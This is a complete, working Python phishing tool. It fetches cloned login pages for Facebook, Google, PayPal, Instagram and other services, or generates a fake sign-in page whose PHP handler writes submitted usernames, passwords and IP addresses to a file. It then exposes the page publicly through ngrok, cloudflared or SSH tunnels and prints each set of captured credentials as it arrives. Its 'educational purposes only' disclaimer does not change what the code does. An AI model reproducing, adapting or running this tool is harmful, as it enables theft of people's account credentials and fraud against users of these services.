#!/usr/bin/env python3
import os
import sys
import time
import socket
import subprocess
from threading import Thread
from datetime import datetime
import re
import random
import requests

# Color codes
RED = "\033[1;91m"
GREEN = "\033[1;92m"
YELLOW = "\033[1;93m"
BLUE = "\033[1;94m"
MAGENTA = "\033[1;95m"
CYAN = "\033[1;96m"
WHITE = "\033[1;97m"
RESET = "\033[0m"

# Banner
def banner():
    print(f"""{RED}
  ___  _  _  ____  _  _  ___  ____  _  _  ____  _  _ 
 / __)( \/ )(  _ \( \/ )/ __)(_  _)( \( )(  _ \( \/ )
( (__  \  /  )___/ \  / \__ \  )(   )  (  )___/ \  / 
 \___)  \/  (__)   (__)(___/ (__) (_)\_)(__)    (__) 
{GREEN}
        Terminal Phishing Automation Tool
{RESET}
    {YELLOW}** For Educational Purposes Only **{RESET}
""")

# Disclaimer
def disclaimer():
    print(f"\n{RED}DISCLAIMER:{RESET}")
    print(f"{YELLOW}This tool is provided for educational and ethical testing purposes only.")
    print("Unauthorized use of this tool to attack targets without prior mutual consent is illegal.")
    print("The developer assumes no liability and is not responsible for any misuse or damage caused.")
    print(f"By using this tool, you agree to use it only for legitimate, legal purposes.{RESET}\n")
    
    consent = input(f"{CYAN}Do you agree to use this tool responsibly? (y/n): {RESET}").lower()
    if consent != 'y':
        print(f"{RED}Exiting...{RESET}")
        sys.exit(0)

# Check dependencies
def check_dependencies():
    required = ['php', 'wget', 'unzip']
    missing = []
    
    for dep in required:
        try:
            subprocess.run([dep, '--version'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        except FileNotFoundError:
            missing.append(dep)
    
    return missing

# Templates
templates = {
    '1': {'name': 'Facebook', 'dir': 'facebook', 'url': 'https://github.com/htr-tech/zphisher/raw/main/.github/files/facebook.zip'},
    '2': {'name': 'Instagram', 'dir': 'instagram', 'url': 'https://github.com/htr-tech/zphisher/raw/main/.github/files/instagram.zip'},
    '3': {'name': 'Twitter', 'dir': 'twitter', 'url': 'https://github.com/htr-tech/zphisher/raw/main/.github/files/twitter.zip'},
    '4': {'name': 'Google', 'dir': 'google', 'url': 'https://github.com/htr-tech/zphisher/raw/main/.github/files/google.zip'},
    '5': {'name': 'LinkedIn', 'dir': 'linkedin', 'url': 'https://github.com/htr-tech/zphisher/raw/main/.github/files/linkedin.zip'},
    '6': {'name': 'GitHub', 'dir': 'github', 'url': 'https://github.com/htr-tech/zphisher/raw/main/.github/files/github.zip'},
    '7': {'name': 'Netflix', 'dir': 'netflix', 'url': 'https://github.com/htr-tech/zphisher/raw/main/.github/files/netflix.zip'},
    '8': {'name': 'PayPal', 'dir': 'paypal', 'url': 'https://github.com/htr-tech/zphisher/raw/main/.github/files/paypal.zip'},
    '9': {'name': 'Steam', 'dir': 'steam', 'url': 'https://github.com/htr-tech/zphisher/raw/main/.github/files/steam.zip'},
    '10': {'name': 'Custom Template', 'dir': 'custom', 'url': None}
}

# Download template
def download_template(url, dir_name):
    try:
        print(f"{YELLOW}Downloading template...{RESET}")
        subprocess.run(['wget', '--quiet', '--show-progress', '-O', 'template.zip', url], check=True)
        subprocess.run(['unzip', '-qo', 'template.zip', '-d', dir_name], check=True)
        subprocess.run(['rm', 'template.zip'], check=True)
        print(f"{GREEN}Template downloaded and extracted successfully!{RESET}")
        return True
    except subprocess.CalledProcessError:
        print(f"{RED}Failed to download or extract template.{RESET}")
        return False

# Create custom template
def create_custom_template():
    print(f"\n{CYAN}Custom Template Creation{RESET}")
    dir_name = input(f"{YELLOW}Enter directory name for template: {RESET}").strip()
    if not dir_name:
        dir_name = f"custom_{random.randint(1000,9999)}"
    
    os.makedirs(dir_name, exist_ok=True)
    
    print(f"\n{YELLOW}Creating basic phishing template structure in {dir_name}/{RESET}")
    
    # Create basic files
    with open(f"{dir_name}/index.html", "w") as f:
        f.write("""<!DOCTYPE html>
<html>
<head>
    <title>Login Page</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f0f2f5; }
        .login-box { width: 400px; margin: 100px auto; background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .login-box h2 { text-align: center; color: #1877f2; }
        .input-group { margin-bottom: 15px; }
        .input-group label { display: block; margin-bottom: 5px; font-weight: bold; }
        .input-group input { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
        .login-btn { width: 100%; padding: 10px; background-color: #1877f2; color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
        .login-btn:hover { background-color: #166fe5; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>Sign In</h2>
        <form action="login.php" method="POST">
            <div class="input-group">
                <label for="username">Username or Email</label>
                <input type="text" id="username" name="username" required>
            </div>
            <div class="input-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit" class="login-btn">Log In</button>
        </form>
    </div>
</body>
</html>""")
    
    with open(f"{dir_name}/login.php", "w") as f:
        f.write("""<?php
$username = $_POST['username'];
$password = $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];
$date = date('Y-m-d H:i:s');

$data = "Username: $username | Password: $password | IP: $ip | Date: $date\\n";

file_put_contents('credentials.txt', $data, FILE_APPEND);
header('Location: https://example.com');
exit();
?>""")
    
    print(f"{GREEN}Basic custom template created in {dir_name}/{RESET}")
    return dir_name

# Start PHP server
def start_php_server(port, dir_name):
    try:
        php_process = subprocess.Popen(['php', '-S', f'127.0.0.1:{port}', '-t', dir_name], 
                                     stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return php_process
    except Exception as e:
        print(f"{RED}Failed to start PHP server: {e}{RESET}")
        return None

# Start ngrok tunnel
def start_ngrok(port):
    try:
        ngrok_process = subprocess.Popen(['ngrok', 'http', str(port)], 
                                       stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        time.sleep(5)  # Wait for ngrok to start
        
        # Get ngrok URL
        try:
            resp = requests.get('http://localhost:4040/api/tunnels')
            data = resp.json()
            public_url = data['tunnels'][0]['public_url']
            return (ngrok_process, public_url)
        except:
            print(f"{RED}Failed to get ngrok URL. Make sure ngrok is properly configured.{RESET}")
            return (ngrok_process, None)
    except FileNotFoundError:
        print(f"{YELLOW}ngrok not found. Trying cloudflared...{RESET}")
        return start_cloudflared(port)

# Start cloudflared tunnel
def start_cloudflared(port):
    try:
        cloudflared_process = subprocess.Popen(['cloudflared', 'tunnel', '--url', f'http://localhost:{port}'], 
                                            stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        time.sleep(5)  # Wait for cloudflared to start
        
        # Cloudflared doesn't have an easy API to get URL, so we parse stderr
        for _ in range(10):
            line = cloudflared_process.stderr.readline().decode().strip()
            if line.startswith('https://'):
                return (cloudflared_process, line)
            time.sleep(1)
        
        print(f"{RED}Failed to get cloudflared URL.{RESET}")
        return (cloudflared_process, None)
    except FileNotFoundError:
        print(f"{YELLOW}cloudflared not found. Trying localhost.run...{RESET}")
        return start_localhost_run(port)

# Start localhost.run tunnel
def start_localhost_run(port):
    try:
        print(f"{YELLOW}Starting localhost.run tunnel...{RESET}")
        print(f"{CYAN}Note: This requires SSH access and may ask for credentials.{RESET}")
        
        # Run ssh in a thread and capture output
        output = []
        def run_ssh():
            ssh_process = subprocess.Popen(['ssh', '-R', '80:localhost:' + str(port), 'ssh.localhost.run'], 
                                          stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            for line in ssh_process.stdout:
                line = line.decode().strip()
                output.append(line)
                print(line)
        
        ssh_thread = Thread(target=run_ssh)
        ssh_thread.daemon = True
        ssh_thread.start()
        
        # Wait for URL to appear
        time.sleep(10)
        for line in output:
            if line.startswith('http'):
                return (None, line.split()[-1])
        
        print(f"{RED}Failed to get localhost.run URL.{RESET}")
        return (None, None)
    except FileNotFoundError:
        print(f"{RED}All tunneling options failed. You can access the page at http://localhost:{port}{RESET}")
        return (None, f"http://localhost:{port}")

# Monitor credentials file
def monitor_credentials(dir_name):
    cred_file = f"{dir_name}/credentials.txt"
    if not os.path.exists(cred_file):
        open(cred_file, 'w').close()
    
    last_size = 0
    while True:
        current_size = os.path.getsize(cred_file)
        if current_size > last_size:
            with open(cred_file, 'r') as f:
                f.seek(last_size)
                new_entries = f.read()
                print(f"\n{GREEN}New credentials captured:{RESET}")
                print(new_entries)
                last_size = current_size
        time.sleep(2)

# Main menu
def main_menu():
    while True:
        print(f"\n{CYAN}Available Templates:{RESET}")
        for num, template in templates.items():
            print(f"  {GREEN}{num}.{RESET} {template['name']}")
        
        print(f"\n  {RED}0.{RESET} Exit")
        
        choice = input(f"\n{YELLOW}Select an option (1-{len(templates)}): {RESET}").strip()
        
        if choice == '0':
            print(f"{RED}Exiting...{RESET}")
            sys.exit(0)
        elif choice in templates:
            if choice == '10':  # Custom template
                dir_name = create_custom_template()
            else:
                template = templates[choice]
                dir_name = template['dir']
                if template['url'] and not os.path.exists(dir_name):
                    if not download_template(template['url'], dir_name):
                        continue
            
            return dir_name
        else:
            print(f"{RED}Invalid selection. Please try again.{RESET}")

# Main function
def main():
    banner()
    disclaimer()
    
    # Check dependencies
    missing = check_dependencies()
    if missing:
        print(f"{RED}Missing dependencies:{RESET}")
        for dep in missing:
            print(f" - {dep}")
        print(f"\n{YELLOW}Please install them before proceeding.{RESET}")
        sys.exit(1)
    
    # Select template
    dir_name = main_menu()
    
    # Start PHP server
    port = random.randint(8000, 9000)
    php_process = start_php_server(port, dir_name)
    if not php_process:
        sys.exit(1)
    
    print(f"\n{GREEN}PHP server started on port {port}{RESET}")
    
    # Start tunnel
    tunnel_process, public_url = start_ngrok(port)
    if public_url:
        print(f"\n{GREEN}Public URL: {public_url}{RESET}")
        
        # Try to open browser
        try:
            subprocess.run(['xdg-open', public_url], check=False)
        except:
            pass
    
    # Start monitoring credentials
    try:
        monitor_thread = Thread(target=monitor_credentials, args=(dir_name,))
        monitor_thread.daemon = True
        monitor_thread.start()
        
        print(f"\n{YELLOW}Monitoring for credentials... Press Ctrl+C to stop.{RESET}")
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{RED}Stopping servers...{RESET}")
        if php_process:
            php_process.terminate()
        if tunnel_process:
            tunnel_process.terminate()
        print(f"{GREEN}Servers stopped. Credentials saved to {dir_name}/credentials.txt{RESET}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{RED}Exiting...{RESET}")
        sys.exit(0)